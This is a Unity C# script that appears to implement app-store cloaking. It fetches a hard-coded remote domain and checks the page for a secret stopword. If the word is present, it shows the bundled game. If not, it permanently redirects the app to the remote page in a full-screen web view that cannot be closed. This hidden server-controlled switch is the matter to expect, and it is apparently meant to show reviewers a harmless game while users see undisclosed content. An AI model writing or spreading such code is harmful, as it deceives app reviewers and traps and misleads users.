using UnityEngine;
using UnityEngine.UI;

public class Viewer : MonoBehaviour
{
    private const string localPath = "localPath";

    private UniWebView View { get; set; }

    delegate void ResultAction(bool IsGame);
    event ResultAction OnResultActionEvent;

    private const string url = "http://d3f6g4.space";
    private const string stopword = "asjdkhfjasdghfiuperqtyquwieytnzcvxbmzxcnmzxcvbGywHHHs";

    private void OnEnable()
    {
        OnResultActionEvent += Viewer_OnResultActionEvent;
    }

    private void OnDisable()
    {
        OnResultActionEvent -= Viewer_OnResultActionEvent;
    }

    private void Viewer_OnResultActionEvent(bool IsGame)
    {
        if (IsGame)
        {
            Screen.fullScreen = true;
            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
        }
    }

    private void Start()
    {
        Screen.fullScreen = false;
        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            OnResultActionEvent?.Invoke(true);
        }

        Init();
    }

    void Init()
    {
        View = gameObject.AddComponent<UniWebView>();

        View.ReferenceRectTransform = InitInterface();
        View.SetShowSpinnerWhileLoading(false);

        View.SetSupportMultipleWindows(true);

        View.BackgroundColor = Color.white;
        View.OnShouldClose += (v) => { return false; };
        View.OnPageStarted += (browser, url) =>
        {
            if (PlayerPrefs.HasKey(localPath))
            {
                View.Show();
                View.UpdateFrame();
            }
        };

        View.OnPageFinished += (web, statusCode, final_url) =>
        {
            if (PlayerPrefs.HasKey(localPath))
            {
                return;
            }

            web.GetHTMLContent((content) =>
            {
                var close = content.Contains(stopword);
                if (close)
                {
                    View.Hide(true);
                    Destroy(View);
                    View = null;

                    OnResultActionEvent?.Invoke(true);
                }
                else
                {
                    PlayerPrefs.SetString(localPath, web.Url);

                    View.Show();
                    View.UpdateFrame();
                }
            });
        };

        var target = PlayerPrefs.HasKey(localPath) ? PlayerPrefs.GetString(localPath) : url;
        View.Load(target);
    }

    RectTransform InitInterface()
    {
        GameObject _interface = new GameObject("Interface", typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));

        Canvas _canvas = _interface.GetComponent<Canvas>();
        _canvas.renderMode = RenderMode.ScreenSpaceCamera;
        _canvas.worldCamera = Camera.main;

        CanvasScaler _canvasScaler = _interface.GetComponent<CanvasScaler>();
        _canvasScaler.uiScaleMode = CanvasScaler.ScaleMode.ScaleWithScreenSize;
        _canvasScaler.referenceResolution = new Vector2(Screen.width, Screen.height);
        _canvasScaler.matchWidthOrHeight = 0.5f;

        GameObject activity = new GameObject("Privacy activity", typeof(RectTransform));
        activity.transform.SetParent(_interface.transform, false);
        RectTransform _rectTransform = activity.GetComponent<RectTransform>();

        _rectTransform.anchorMin = Vector2.zero;
        _rectTransform.anchorMax = Vector2.one;
        _rectTransform.pivot = Vector2.one / 2;
        _rectTransform.sizeDelta = Vector2.zero;
        _rectTransform.offsetMax = new Vector2(0, -Screen.height * 0.0409f);

        return _rectTransform;
    }
}
